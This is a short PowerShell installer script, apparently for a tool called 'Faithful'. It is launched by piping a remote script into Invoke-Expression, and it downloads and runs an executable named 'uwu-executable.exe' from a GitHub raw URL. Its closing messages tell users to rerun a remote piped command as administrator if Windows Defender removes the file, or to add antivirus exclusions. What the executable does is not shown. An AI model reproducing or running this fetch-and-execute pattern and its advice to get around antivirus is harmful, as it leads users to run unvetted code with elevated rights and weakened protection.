# Command to execute:
# iwr faithful.cf | iex

cd $env:userprofile
Write-Output "[LAST UPDATE]: 22/5/2022 12:45 PM"
Write-Output "(INFO) Downloading executable file..."
Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/uwu-executable.exe -OutFile "uwu.exe"
Write-Output "(INFO) Running executable..."
Start-Process ("uwu.exe")
Write-Output "(INFO) Done!"
Write-Output "If Windows Defender automatically removes the Faithful executable, run 'iwr a.faithful.cf | iex' as an administrator instead."
Write-Output "If you are using any other antivirus and face issues with them, add exclusions for the paths stated in the above command manually."
